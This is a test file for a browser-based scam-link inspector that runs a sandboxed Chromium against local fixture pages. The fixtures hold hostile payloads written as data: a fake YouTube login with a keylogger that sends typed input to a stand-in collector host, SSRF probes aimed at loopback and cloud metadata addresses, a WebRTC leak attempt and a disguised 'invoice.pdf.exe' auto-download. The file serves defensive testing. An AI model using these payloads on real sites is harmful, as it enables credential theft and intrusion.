import { execFileSync } from "node:child_process";
import dgram from "node:dgram";
import { existsSync, readdirSync } from "node:fs";
import http from "node:http";
import net from "node:net";
import os from "node:os";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { runDynamicInspection } from "@/lib/linkscan/dynamic/runner";

/**
 * Dynamic inspection against LOCAL fixture pages only (no live malicious content, no internet):
 * fixture hostnames are routed to a loopback server by the proxy's test-only host map, and every
 * other name is refused by the resolver. Verifies isolation (proxy-only network, SSRF blocks,
 * no UDP), behaviour detection (typed-data exfiltration, prompts, downloads) and cleanup.
 */

const CHROMIUM = existsSync(`${os.homedir()}/Library/Caches/ms-playwright`);
let fixture: http.Server;
let port = 0;
let directHits = 0;
const udpPackets: number[] = [];
let udp: dgram.Socket;
let udpPort = 0;
const hits: string[] = [];

const page = (body: string, title = "Page") => `<!doctype html><html><head><title>${title}</title></head><body>${body}</body></html>`;

beforeAll(async () => {
  udp = dgram.createSocket("udp4");
  udp.on("message", () => udpPackets.push(Date.now()));
  await new Promise<void>((r) => udp.bind(0, "127.0.0.1", () => r()));
  udpPort = udp.address().port;
  fixture = http.createServer((req, res) => {
    const host = (req.headers.host ?? "").split(":")[0];
    hits.push(`${host}${req.url}`);
    if (req.url?.startsWith("/direct")) {
      directHits++;
      res.end("direct");
      return;
    }
    const html = (s: string) => res.writeHead(200, { "content-type": "text/html" }).end(s);
    switch (host) {
      case "fake-yt.test":
        return html(page(`<h1>YouTube</h1><form action="http://collector.test/login" method="post"><input type="email" name="email"><input type="password" name="pw"></form>
          <script>document.querySelectorAll('input').forEach(i => i.addEventListener('input', () => fetch('http://collector.test/k?d=' + encodeURIComponent(i.value))));</script>`, "YouTube - Sign in to watch"));
      case "collector.test":
        return res.end("ok");
      case "wrapper.test":
        return html(page(`<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" width="560" height="315"></iframe>
          <p>Update your video player to continue watching.</p><a href="/player-update.apk">Download</a>
          <script>
            Notification.requestPermission();
            for (const u of ['http://127.0.0.1:${port}/direct', 'http://169.254.169.254/latest/meta-data/', 'http://[::1]:${port}/direct', 'http://2130706433:${port}/direct', 'http://0x7f.0.0.1:${port}/direct', 'http://localhost:${port}/direct', 'http://10.0.0.1/']) fetch(u).catch(() => {});
            try { new WebSocket('ws://127.0.0.1:${port}/direct'); } catch (e) {}
            try { const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${udpPort}' }] }); pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o)); } catch (e) {}
            setTimeout(() => { const a = document.createElement('a'); a.href = '/auto.exe'; a.download = 'invoice.pdf.exe'; document.body.appendChild(a); a.click(); }, 300);
          </script>`, "Watch video"));
      case "search-site.test":
        if (req.url?.startsWith("/suggest")) return res.end("[]");
        return html(page(`<input type="search" name="q" id="q"><script>document.getElementById('q').addEventListener('input', e => fetch('/suggest?q=' + encodeURIComponent(e.target.value)));</script>`, "Search"));
      case "legit-embed.test":
        return html(page(`<article><h1>My cooking blog</h1><p>Here is the recipe video.</p><iframe src="https://www.youtube.com/embed/abc123def45" width="560" height="315"></iframe></article>`, "Cooking blog"));
      default:
        if (req.url?.endsWith(".exe") || req.url?.endsWith(".apk")) {
          res.writeHead(200, { "content-type": "application/octet-stream", "content-disposition": "attachment; filename=invoice.pdf.exe" }).end(Buffer.from("MZ\x90\x00fake-test-bytes"));
          return;
        }
        res.writeHead(404).end();
    }
  });
  await new Promise<void>((r) => fixture.listen(0, "127.0.0.1", () => r()));
  port = (fixture.address() as net.AddressInfo).port;
});
afterAll(async () => {
  await new Promise((r) => fixture.close(r));
  udp.close();
});

function descendants(roots: string[]): string[] {
  const all = new Set(roots);
  let frontier = [...roots];
  while (frontier.length) {
    const next: string[] = [];
    for (const p of frontier) {
      try {
        for (const c of execFileSync("pgrep", ["-P", p]).toString().trim().split("\n").filter(Boolean)) if (!all.has(c)) { all.add(c); next.push(c); }
      } catch {
        /* no children */
      }
    }
    frontier = next;
  }
  return [...all];
}

const testHosts = () =>
  Object.fromEntries(["fake-yt.test", "collector.test", "wrapper.test", "legit-embed.test", "search-site.test"].map((h) => [h, { host: "127.0.0.1", port }]));
const noInternet = async (h: string): Promise<string[]> => {
  throw new Error(`no real DNS in tests (${h})`);
};
const inspect = (url: string, extra: Parameters<typeof runDynamicInspection>[2] = {}) =>
  runDynamicInspection(url, undefined, { timeoutMs: 25_000, observeMs: 1500, resolver: noInternet, proxy: { testHosts: testHosts(), resolver: noInternet }, ...extra });

describe.skipIf(!CHROMIUM)("dynamic page inspection (isolated browser)", () => {
  it("observes a fake YouTube page sending typed data to another site (synthetic data, never submitted)", async () => {
    const r = await inspect("http://fake-yt.test/");
    expect(r.status).toBe("completed");
    expect(r.typedDataSentTo).toContain("collector.test");
    expect(r.passwordFieldsAfterScripts).toBe(1);
    expect(hits.some((h) => h.startsWith("collector.test/login"))).toBe(false); // the form was never submitted
  }, 60_000);

  it("wrapper: prompts, auto-download and every SSRF / direct-network attempt are blocked and reported", async () => {
    const pids: number[] = [];
    const sockets: string[] = [];
    let proxyPort = 0;
    const r = await inspect("http://wrapper.test/", {
      onStart: (pid, profileDir) => {
        pids.push(pid);
        // Sample the real Chromium processes' TCP connections while the page runs.
        const t = setInterval(() => {
          try {
            // The browser process plus all its helpers (the network service is a child process).
            const group = descendants(execFileSync("pgrep", ["-f", profileDir]).toString().trim().split("\n").filter(Boolean));
            if (!group.length) return;
            const out = execFileSync("lsof", ["-a", "-nP", "-iTCP", "-p", group.join(",")], { stdio: ["ignore", "pipe", "ignore"] }).toString();
            for (const l of out.split("\n").slice(1)) if (l.includes("->")) sockets.push(l.split("->")[1].split(" ")[0]);
          } catch {
            /* process gone */
          }
        }, 80);
        setTimeout(() => clearInterval(t), 20_000);
      },
    });
    expect(["completed", "partial"]).toContain(r.status);
    expect(r.permissionRequests).toContain("notifications");
    expect(r.downloadsAttempted.length).toBeGreaterThan(0);
    // Nothing reached the fixture server directly (all attempts went to the proxy and were refused).
    expect(directHits).toBe(0);
    const reasons = r.requests.blocked.map((b) => b.reason);
    expect(reasons.some((x) => /private_ip|internal_hostname|single_label/.test(x))).toBe(true);
    expect(r.requests.blocked.some((b) => b.target.includes("169.254.169.254"))).toBe(true);
    // No UDP left the browser (WebRTC limited to proxied traffic).
    expect(udpPackets).toHaveLength(0);
    // Every TCP connection Chromium held went to the proxy on loopback.
    proxyPort = Number(sockets[0]?.split(":").pop());
    expect(sockets.length).toBeGreaterThan(0);
    expect(sockets.every((s) => s.startsWith("127.0.0.1:") && Number(s.split(":").pop()) === proxyPort)).toBe(true);
  }, 60_000);

  it("search-as-you-type to the site's own server is NOT reported as data theft", async () => {
    const r = await inspect("http://search-site.test/");
    expect(r.status).toBe("completed");
    expect(r.detail).toMatch(/Typed synthetic test data into 1 field/);
    expect(hits.some((h) => h.startsWith("search-site.test/suggest?q=ssq"))).toBe(true); // it really was sent…
    expect(r.typedDataSentTo).toEqual([]); // …and correctly not called exfiltration
    expect(r.passwordSentToSameSite).toEqual([]);
  }, 60_000);

  it("a legitimate page with a YouTube embed shows no exfiltration or permission requests", async () => {
    const r = await inspect("http://legit-embed.test/");
    expect(r.status).toBe("completed");
    expect(r.typedDataSentTo).toEqual([]);
    expect(r.permissionRequests).toEqual([]);
    expect(r.downloadsAttempted).toEqual([]);
    expect(r.framesAfterScripts.some((f) => f.includes("youtube.com/embed/"))).toBe(true);
  }, 60_000);

  it("cleans up: no profile directory or browser process is left behind; cancellation stops it", async () => {
    const before = readdirSync(os.tmpdir()).filter((n) => n.startsWith("scamshield-inspect-")).length;
    const ctrl = new AbortController();
    let profile = "";
    let sawBrowser = false;
    const r = await runDynamicInspection("http://wrapper.test/", ctrl.signal, {
      timeoutMs: 25_000, observeMs: 10_000, resolver: noInternet, proxy: { testHosts: testHosts(), resolver: noInternet },
      onStart: (_p, dir) => {
        profile = dir;
        // Cancel only once Chromium is really running, to prove it gets killed.
        const t = setInterval(() => {
          try {
            execFileSync("pgrep", ["-f", dir]);
            sawBrowser = true;
            clearInterval(t);
            setTimeout(() => ctrl.abort(), 500);
          } catch {
            /* not yet */
          }
        }, 100);
      },
    });
    expect(sawBrowser).toBe(true);
    expect(r.status).toBe("cancelled");
    const after = readdirSync(os.tmpdir()).filter((n) => n.startsWith("scamshield-inspect-")).length;
    expect(after).toBe(before);
    let alive = true;
    try {
      execFileSync("pgrep", ["-f", profile]); // any Chromium still using the run's profile?
    } catch {
      alive = false;
    }
    expect(alive).toBe(false);
    expect(existsSync(profile)).toBe(false);
  }, 60_000);

  it("a hard time limit returns partial results", async () => {
    const r = await runDynamicInspection("http://fake-yt.test/", undefined, { timeoutMs: 5_000, observeMs: 30_000, resolver: noInternet, proxy: { testHosts: testHosts(), resolver: noInternet } });
    expect(["timeout", "completed", "partial"]).toContain(r.status);
    expect(r.durationMs).toBeLessThan(12_000);
  }, 30_000);

  it("only one inspection runs at a time", async () => {
    const [a, b] = await Promise.all([inspect("http://legit-embed.test/"), inspect("http://legit-embed.test/")]);
    expect([a.status, b.status]).toContain("unavailable");
  }, 60_000);
});
